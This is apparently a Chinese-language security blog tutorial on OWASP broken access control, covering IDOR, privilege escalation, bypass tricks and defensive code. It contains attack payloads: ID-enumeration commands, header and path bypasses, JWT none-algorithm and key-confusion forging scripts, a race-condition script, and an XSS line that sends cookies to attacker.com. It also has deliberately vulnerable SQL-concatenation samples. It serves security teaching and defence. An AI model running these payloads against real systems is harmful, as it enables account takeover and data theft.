---
layout: post
title: "A01:2025-Broken Access Control 权限控制失效完全指南"
date: 2026-03-17 10:00:00 +0800
categories: [网络安全, Web安全]
tags: [权限控制失效, Broken Access Control, IDOR, 越权访问, 安全防御, 渗透测试, OWASP Top 10]
author: Security Researcher
---

> **免责声明**：本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。

## 目录
- [什么是权限控制失效](#什么是权限控制失效)
- [权限控制失效的原理](#权限控制失效的原理)
- [常见攻击类型](#常见攻击类型)
- [攻击技巧与Payload](#攻击技巧与payload)
- [绕过技巧](#绕过技巧)
- [实战案例分析](#实战案例分析)
- [防御措施](#防御措施)
- [总结](#总结)

---

## 什么是权限控制失效

**权限控制失效（Broken Access Control）** 是OWASP Top 10 2025中排名第一的安全漏洞，指应用程序未能正确执行访问控制策略，导致用户可以访问其权限范围之外的数据或功能。

### 权限控制失效的危害

| 危害类型 | 具体表现 |
|---------|---------|
| 数据泄露 | 访问其他用户的敏感信息（订单、聊天记录、个人信息等） |
| 未授权操作 | 执行删除、修改等本不该有权限的操作 |
| 权限提升 | 普通用户获取管理员权限 |
| 账户接管 | 接管其他用户账户 |
| 数据篡改 | 修改其他用户的数据 |
| 系统破坏 | 删除关键数据或配置 |

### 常见漏洞场景

1. **URL参数篡改**：通过修改URL中的ID参数访问他人资源
2. **API接口暴露**：未对API端点进行权限验证
3. **隐藏目录/文件**：通过猜测或爆破访问敏感路径
4. **客户端验证绕过**：仅依赖前端验证，后端未校验
5. **会话管理缺陷**：会话固定、会话劫持导致的越权
6. **CORS配置错误**：跨域资源共享配置不当

---

## 权限控制失效的原理

### 漏洞产生原因

权限控制失效的根本原因是**应用程序未能正确验证用户的身份和权限**，就允许其访问资源或执行操作。

#### 漏洞代码示例

**PHP示例（存在漏洞）：**

```php
<?php
// 危险：仅检查用户是否登录，未验证数据所有权
session_start();
if (!isset($_SESSION['user_id'])) {
    die('未登录');
}

$order_id = $_GET['id'];
// 危险：直接查询，未验证该订单是否属于当前用户
$query = "SELECT * FROM orders WHERE id = $order_id";
$result = mysqli_query($conn, $query);
$order = mysqli_fetch_assoc($result);
?>
```

**Java示例（存在漏洞）：**

```java
@GetMapping("/api/users/{userId}/orders")
public List<Order> getUserOrders(@PathVariable String userId) {
    // 危险：未验证当前登录用户是否有权查看该用户的订单
    return orderService.findByUserId(userId);
}
```

**Python/Flask示例（存在漏洞）：**

```python
@app.route('/api/documents/<int:doc_id>')
@login_required
def get_document(doc_id):
    # 危险：仅检查登录状态，未验证文档访问权限
    doc = Document.query.get(doc_id)
    return jsonify(doc.to_dict())
```

#### 攻击示例

正常请求（用户A查看自己的订单）：
```
GET /order.php?id=1001
Cookie: session=abc123
```

恶意请求（用户A尝试查看用户B的订单）：
```
GET /order.php?id=1002
Cookie: session=abc123
```

如果应用程序未验证订单1002是否属于当前登录用户，就会导致越权访问。

### 攻击流程

```
发现功能点 → 识别资源标识符 → 尝试越权访问 → 验证漏洞存在 → 扩大攻击范围
```

---

## 常见攻击类型

### 1. IDOR（Insecure Direct Object Reference）

**IDOR（不安全的直接对象引用）** 是最常见的权限控制失效类型，指应用程序直接使用用户提供的输入作为数据库对象的引用，而未验证用户是否有权访问该对象。

#### 攻击方式

**数字型ID遍历：**
```
https://example.com/api/users/1/profile
https://example.com/api/users/2/profile
https://example.com/api/users/3/profile
```

**UUID/GUID遍历：**
```
https://example.com/api/documents/a1b2c3d4-e5f6-7890-abcd-ef1234567890
https://example.com/api/documents/b2c3d4e5-f6a7-8901-bcde-f23456789012
```

#### 代码示例

**存在漏洞的代码：**
```php
<?php
// 危险：直接使用用户提供的ID查询
$document_id = $_GET['id'];
$query = "SELECT * FROM documents WHERE id = '$document_id'";
$result = mysqli_query($conn, $query);
?>
```

**修复后的代码：**
```php
<?php
// 安全：验证当前用户是否有权访问该文档
$document_id = $_GET['id'];
$current_user_id = $_SESSION['user_id'];

$query = "SELECT * FROM documents WHERE id = ? AND owner_id = ?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, "ii", $document_id, $current_user_id);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);

if (mysqli_num_rows($result) == 0) {
    http_response_code(403);
    die('无权访问该文档');
}
?>
```

### 2. 水平越权（Horizontal Privilege Escalation）

**水平越权** 指同一权限级别的用户之间可以互相访问或操作对方的资源。

#### 常见场景

| 场景 | 攻击示例 |
|------|---------|
| 订单查看 | 修改订单ID查看他人订单 |
| 消息读取 | 修改消息ID读取他人私信 |
| 资料修改 | 修改用户ID参数篡改他人资料 |
| 文件下载 | 修改文件ID下载他人文件 |

#### 攻击示例

**场景：社交平台私信功能**

正常请求：
```
GET /api/messages/1001
```

攻击请求：
```
GET /api/messages/1002
GET /api/messages/1003
GET /api/messages/1004
```

**场景：电商订单管理**

```python
# 存在漏洞的代码
@app.route('/api/orders/<int:order_id>')
@login_required
def view_order(order_id):
    order = Order.query.get(order_id)
    # 缺少权限验证：未检查order.user_id是否等于current_user.id
    return jsonify(order.to_dict())
```

### 3. 垂直越权（Vertical Privilege Escalation）

**垂直越权** 指低权限用户可以访问或执行高权限用户的功能。

#### 常见场景

| 场景 | 攻击示例 |
|------|---------|
| 管理员功能 | 普通用户访问管理后台 |
| 敏感操作 | 普通用户执行删除、审核等操作 |
| 数据导出 | 普通用户导出全量数据 |
| 配置修改 | 普通用户修改系统配置 |

#### 攻击示例

**场景：隐藏的管理接口**

```
# 普通用户界面
GET /user/dashboard

# 猜测管理接口
GET /admin/dashboard
GET /admin/users
GET /api/admin/users
GET /management/users
```

**场景：参数控制权限**

```
POST /api/users/update
Content-Type: application/json

{
    "user_id": 123,
    "role": "admin"  # 尝试提升权限
}
```

**场景：Cookie/Token篡改**

```javascript
// 原始Cookie
{ "user_id": 123, "role": "user" }

// 篡改后的Cookie
{ "user_id": 123, "role": "admin" }
```

### 4. 未授权访问（Unauthorized Access）

**未授权访问** 指无需任何身份验证即可访问受保护的资源或功能。

#### 常见场景

| 场景 | 描述 |
|------|------|
| 暴露的API端点 | 敏感API未进行身份验证 |
| 目录遍历 | 可以访问未授权的文件目录 |
| 备份文件泄露 | 访问数据库备份、源代码备份等 |
| 配置信息泄露 | 访问配置文件、环境变量等 |

#### 攻击示例

**场景：未授权的API访问**

```
# 应该需要认证的API
GET /api/internal/users
GET /api/internal/config
GET /api/internal/logs
```

**场景：敏感文件访问**

```
/.env
/config.php.bak
/.git/config
/backup/database.sql
/api/swagger-ui.html
/actuator/env  # Spring Boot
```

### 5. 会话相关越权

#### 会话固定攻击（Session Fixation）

```python
# 攻击者设置已知的会话ID
https://example.com/login?sessionid=ATTACKER_SESSION

# 受害者使用攻击者指定的会话ID登录
# 攻击者使用该会话ID访问受害者账户
```

#### 会话劫持后的越权

```javascript
// 通过XSS窃取管理员Cookie
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// 攻击者使用窃取的Cookie访问管理功能
```

---

## 攻击技巧与Payload

### 1. ID遍历技巧

#### 顺序遍历

```
?id=1
?id=2
?id=3
...
?id=10000
```

#### 批量测试

```bash
# 使用Burp Suite Intruder
# 使用ffuf进行批量测试
ffuf -u "https://target.com/api/users/FUZZ/profile" -w ids.txt -mc 200

# 使用wfuzz
wfuzz -z file,ids.txt https://target.com/api/users/FUZZ/orders
```

#### ID编码绕过

```
# 明文ID
?id=123

# Base64编码
?id=MTIz

# MD5哈希
?id=202cb962ac59075b964b07152d234b70

# 十六进制
?id=7b

# 自定义编码
?id=USER123
```

### 2. HTTP方法绕过

```bash
# 正常GET请求被拒绝
GET /admin/users

# 尝试其他方法
POST /admin/users
PUT /admin/users
DELETE /admin/users
PATCH /admin/users
OPTIONS /admin/users
```

### 3. 请求头绕过

#### X-Original-URL / X-Rewrite-URL

```http
GET /public/page HTTP/1.1
Host: example.com
X-Original-URL: /admin/users
```

#### X-Forwarded-For

```http
GET /api/users/123 HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1
```

#### Referer绕过

```http
GET /admin/dashboard HTTP/1.1
Host: example.com
Referer: https://example.com/admin/login
```

### 4. 参数污染

```
# 单一参数
?id=123

# 参数污染
?id=123&id=456
?id=123&id=admin
?id[]=123&id[]=456
```

### 5. 路径遍历与绕过

```
/admin/users
/./admin/users
/admin/users/
/admin/users/.
//admin/users
/admin/users?param=value
/admin/users#fragment
/ADMIN/USERS  # 大小写
/%61dmin/users  # URL编码
/admin%2fusers  # 编码斜杠
```

### 6. JSON参数攻击

```json
{
    "user_id": 123,
    "role": "admin",
    "is_admin": true,
    "permissions": ["read", "write", "delete", "admin"]
}
```

### 7. GraphQL越权

```graphql
# 查询其他用户数据
{
    user(id: "other_user_id") {
        email
        password
        creditCard
    }
}

# 修改其他用户数据
mutation {
    updateUser(id: "other_user_id", input: {role: "admin"}) {
        id
        role
    }
}
```

---

## 绕过技巧

### 1. 前端验证绕过

很多应用仅依赖前端JavaScript进行权限控制，后端未做验证。

```javascript
// 前端验证（可绕过）
if (user.role !== 'admin') {
    alert('无权访问');
    return;
}

// 直接发送请求到后端API
fetch('/api/admin/delete-user', {
    method: 'POST',
    body: JSON.stringify({userId: 123})
});
```

### 2. 隐藏字段篡改

```html
<!-- 隐藏字段中的权限信息 -->
<input type="hidden" name="role" value="user">
<input type="hidden" name="user_id" value="123">
<input type="hidden" name="is_admin" value="false">
```

修改后提交：
```
role=admin&user_id=456&is_admin=true
```

### 3. JWT令牌篡改

#### 算法混淆攻击（None Algorithm）

```json
// 原始Header
{
    "alg": "HS256",
    "typ": "JWT"
}

// 修改为None算法
{
    "alg": "none",
    "typ": "JWT"
}
```

#### 密钥混淆攻击（RS256 to HS256）

```python
# 使用公钥作为HMAC密钥
import jwt

public_key = open('public.pem').read()
token = jwt.encode(
    {"user_id": 1, "role": "admin"},
    public_key,
    algorithm='HS256'
)
```

### 4. 业务逻辑绕过

#### 多步骤流程跳过

```
步骤1: 选择商品 -> 步骤2: 填写地址 -> 步骤3: 确认订单 -> 步骤4: 支付

# 直接访问最后一步
POST /order/complete
{
    "order_id": 123,
    "status": "paid"
}
```

#### 状态机绕过

```
草稿 -> 待审核 -> 已发布

# 直接从草稿到已发布
POST /article/update
{
    "article_id": 123,
    "status": "published"
}
```

### 5. 时间竞争条件

```python
import threading
import requests

def race_request():
    # 同时发送多个请求，利用竞争条件
    requests.post('https://target.com/api/transfer', 
                  json={'amount': 100, 'to': 'attacker'})

threads = []
for i in range(10):
    t = threading.Thread(target=race_request)
    threads.append(t)
    t.start()
```

---

## 实战案例分析

### 案例1：电商平台订单越权

**漏洞描述：**
某电商平台的订单详情接口存在IDOR漏洞，用户可以通过修改订单ID查看其他用户的订单信息。

**漏洞URL：**
```
GET /api/orders/{order_id}
```

**攻击过程：**
```bash
# 1. 登录后获取自己的订单ID
GET /api/orders/10001

# 2. 尝试访问其他订单ID
GET /api/orders/10002
GET /api/orders/10003
GET /api/orders/10004

# 3. 使用Burp Suite Intruder批量遍历
# Payload: 10000-20000
```

**获取的信息：**
- 其他用户的收货地址、电话
- 购买的商品信息
- 支付金额和支付方式
- 订单状态

**修复建议：**
```python
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id  # 验证订单所有权
    ).first()
    
    if not order:
        return jsonify({'error': 'Order not found'}), 404
    
    return jsonify(order.to_dict())
```

### 案例2：社交平台私信越权

**漏洞描述：**
某社交平台的私信接口未验证消息接收者身份，导致可以读取任意用户的私信。

**漏洞URL：**
```
GET /api/messages/{message_id}
```

**攻击过程：**
```javascript
// 使用脚本批量获取消息
for (let i = 1; i <= 10000; i++) {
    fetch(`/api/messages/${i}`)
        .then(r => r.json())
        .then(data => {
            if (data.content) {
                console.log(`Message ${i}:`, data);
            }
        });
}
```

**影响：**
- 泄露用户私密对话
- 获取敏感信息（手机号、地址等）
- 可能用于勒索或诈骗

### 案例3：管理后台未授权访问

**漏洞描述：**
某网站的管理后台仅通过前端JavaScript控制显示，后端API未进行权限验证。

**发现过程：**
```bash
# 1. 目录扫描发现管理后台
ffuf -u https://target.com/FUZZ -w admin_paths.txt

# 发现：
# /admin
# /admin/dashboard
# /api/admin/users
```

**漏洞利用：**
```bash
# 直接访问管理API
GET /api/admin/users

# 获取所有用户信息
GET /api/admin/users/export

# 修改用户权限
POST /api/admin/users/123/role
{
    "role": "admin"
}
```

### 案例4：JWT权限提升

**漏洞描述：**
某应用使用JWT进行身份认证，但使用了"none"算法，导致可以伪造任意令牌。

**攻击过程：**
```python
import base64
import json

# 构造Header
header = base64.b64encode(json.dumps({
    "alg": "none",
    "typ": "JWT"
}).encode()).decode().rstrip('=')

# 构造Payload
payload = base64.b64encode(json.dumps({
    "user_id": 1,
    "username": "admin",
    "role": "superadmin",
    "exp": 9999999999
}).encode()).decode().rstrip('=')

# 生成Token（无签名）
token = f"{header}.{payload}."

print(f"伪造的Token: {token}")
```

**利用：**
```bash
curl -H "Authorization: Bearer $TOKEN" \
     https://target.com/api/admin/config
```

---

## 防御措施

### 1. 最小权限原则

#### 设计阶段

- 默认拒绝所有访问
- 按需授予最小权限
- 定期审查权限配置

#### 代码实现

```python
# 装饰器实现权限控制
def require_role(role):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not current_user.is_authenticated:
                return jsonify({'error': 'Unauthorized'}), 401
            if current_user.role != role:
                return jsonify({'error': 'Forbidden'}), 403
            return f(*args, **kwargs)
        return decorated_function
    return decorator

@app.route('/admin/users')
@login_required
@require_role('admin')
def admin_users():
    return jsonify(User.query.all())
```

### 2. 服务端验证

#### 数据所有权验证

**PHP：**
```php
<?php
function checkOwnership($resource_id, $resource_type) {
    $current_user_id = $_SESSION['user_id'];
    
    switch ($resource_type) {
        case 'order':
            $query = "SELECT user_id FROM orders WHERE id = ?";
            break;
        case 'document':
            $query = "SELECT owner_id FROM documents WHERE id = ?";
            break;
        default:
            return false;
    }
    
    $stmt = mysqli_prepare($conn, $query);
    mysqli_stmt_bind_param($stmt, "i", $resource_id);
    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_get_result($stmt);
    $row = mysqli_fetch_assoc($result);
    
    return $row && $row['user_id'] == $current_user_id;
}

// 使用
$order_id = $_GET['id'];
if (!checkOwnership($order_id, 'order')) {
    http_response_code(403);
    die('无权访问');
}
?>
```

**Java/Spring：**
```java
@Service
public class OrderService {
    
    public Order getOrder(Long orderId, Long currentUserId) {
        Order order = orderRepository.findById(orderId)
            .orElseThrow(() -> new ResourceNotFoundException("Order not found"));
        
        // 验证所有权
        if (!order.getUserId().equals(currentUserId)) {
            throw new AccessDeniedException("无权访问该订单");
        }
        
        return order;
    }
}

@RestController
public class OrderController {
    
    @GetMapping("/api/orders/{orderId}")
    public Order getOrder(@PathVariable Long orderId, 
                          @AuthenticationPrincipal UserDetails user) {
        return orderService.getOrder(orderId, user.getId());
    }
}
```

**Python/Django：**
```python
from django.core.exceptions import PermissionDenied
from django.shortcuts import get_object_or_404

def view_order(request, order_id):
    order = get_object_or_404(Order, id=order_id)
    
    # 验证所有权
    if order.user != request.user:
        raise PermissionDenied("无权访问该订单")
    
    return render(request, 'order_detail.html', {'order': order})
```

### 3. 使用间接引用映射

```python
# 不安全：直接使用数据库ID
GET /api/documents/123

# 安全：使用间接引用（UUID或映射表）
GET /api/documents/a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

**实现示例：**
```python
import uuid
from cryptography.fernet import Fernet

class SecureID:
    def __init__(self, secret_key):
        self.cipher = Fernet(secret_key)
    
    def encode(self, real_id):
        """将真实ID编码为安全ID"""
        return self.cipher.encrypt(str(real_id).encode()).decode()
    
    def decode(self, secure_id):
        """将安全ID解码为真实ID"""
        try:
            return int(self.cipher.decrypt(secure_id.encode()).decode())
        except:
            return None

# 使用
secure_id = SecureID(app.config['SECRET_KEY'])

@app.route('/api/documents/<secure_id>')
def get_document(secure_id):
    real_id = secure_id.decode(secure_id)
    if real_id is None:
        return jsonify({'error': 'Invalid ID'}), 400
    
    doc = Document.query.get(real_id)
    # ... 继续验证
```

### 4. 安全框架配置

#### Spring Security

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
            .authorizeRequests()
                .antMatchers("/public/**").permitAll()
                .antMatchers("/user/**").hasRole("USER")
                .antMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            .and()
            .formLogin()
            .and()
            .csrf().disable(); // 生产环境应启用
    }
}
```

#### Django

```python
# views.py
from django.contrib.auth.decorators import login_required, permission_required
from django.contrib.admin.views.decorators import staff_member_required

@login_required
def user_dashboard(request):
    pass

@permission_required('app.can_view_reports')
def reports(request):
    pass

@staff_member_required
def admin_panel(request):
    pass
```

### 5. API安全设计

#### RESTful API权限控制

```python
from functools import wraps
from flask_jwt_extended import get_jwt_identity

def require_ownership(resource_model):
    def decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            current_user_id = get_jwt_identity()
            resource_id = kwargs.get('id')
            
            resource = resource_model.query.get(resource_id)
            if not resource:
                return jsonify({'error': 'Not found'}), 404
            
            if resource.user_id != current_user_id:
                return jsonify({'error': 'Forbidden'}), 403
            
            return fn(*args, **kwargs)
        return wrapper
    return decorator

@app.route('/api/orders/<int:id>')
@jwt_required()
@require_ownership(Order)
def get_order(id):
    order = Order.query.get(id)
    return jsonify(order.to_dict())
```

### 6. 会话安全

```python
# 安全的会话配置
app.config.update(
    SESSION_COOKIE_SECURE=True,      # 仅HTTPS
    SESSION_COOKIE_HTTPONLY=True,    # 禁止JavaScript访问
    SESSION_COOKIE_SAMESITE='Strict', # CSRF防护
    PERMANENT_SESSION_LIFETIME=timedelta(hours=1)  # 过期时间
)
```

### 7. 日志与监控

```python
import logging
from functools import wraps

def audit_log(action):
    def decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            current_user = get_current_user()
            
            logging.info(f"AUDIT: User {current_user.id} performing {action} "
                        f"on resource {kwargs}")
            
            result = fn(*args, **kwargs)
            
            logging.info(f"AUDIT: Action {action} completed by user {current_user.id}")
            
            return result
        return wrapper
    return decorator

@app.route('/api/admin/delete-user/<int:user_id>')
@login_required
@require_role('admin')
@audit_log('DELETE_USER')
def delete_user(user_id):
    # ... 删除逻辑
    pass
```

### 8. 安全测试清单

#### 代码审计检查点

- [ ] 所有敏感操作都进行身份验证
- [ ] 所有资源访问都验证所有权
- [ ] 不使用客户端传来的数据进行权限判断
- [ ] 敏感操作记录审计日志
- [ ] 错误信息不泄露敏感信息
- [ ] 会话管理安全（过期、刷新）
- [ ] 密码和敏感数据加密存储
- [ ] 使用最新的安全框架和库

#### 渗透测试检查点

- [ ] IDOR测试（遍历所有ID参数）
- [ ] 水平越权测试（同权限用户间）
- [ ] 垂直越权测试（低权限到高权限）
- [ ] 未授权访问测试（无需登录的接口）
- [ ] HTTP方法绕过测试
- [ ] 请求头绕过测试
- [ ] 参数污染测试
- [ ] JWT安全测试

---

## 总结

权限控制失效是Web应用中最常见且危害最大的安全漏洞之一。防御这类漏洞需要从设计、开发、测试等多个环节入手。

### 防御要点

1. **默认拒绝**：所有资源默认不可访问，按需授权
2. **服务端验证**：永远不要信任客户端输入，所有权限验证在服务端完成
3. **最小权限**：用户只拥有完成工作所需的最小权限
4. **数据隔离**：确保用户只能访问自己的数据
5. **安全框架**：使用成熟的安全框架，不要自己造轮子
6. **日志审计**：记录所有敏感操作，便于追溯

### 安全开发建议

**对于开发者：**
- 在编码前进行威胁建模，识别访问控制点
- 使用参数化查询和ORM，避免直接拼接SQL
- 对所有用户输入进行验证和过滤
- 定期进行安全代码审查
- 使用自动化安全扫描工具

**对于安全研究人员：**
- 在进行渗透测试前确保获得合法授权
- 使用隔离的测试环境进行漏洞研究
- 负责任地披露漏洞，帮助厂商修复
- 遵守相关法律法规和道德准则

### 学习资源

- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - Access Control](https://portswigger.net/web-security/access-control)
- [IDOR Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)
- [狼组安全团队 - 越权访问知识库](https://wiki.wgpsec.org/knowledge/ctf/)

---

## 参考资源

- [OWASP Top 10 2025](https://owasp.org/Top10/)
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- [OWASP Testing Guide - Authorization Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/access-control)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [PayloadsAllTheThings - IDOR](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References)
- [HackerOne Hacktivity](https://hackerone.com/hacktivity)
- [Bugcrowd Blog](https://www.bugcrowd.com/blog/)

---

*本文仅供学习交流使用，请勿用于非法用途。进行安全测试时，请确保已获得目标系统的合法授权。*

*本文最后更新于：2026年3月17日*
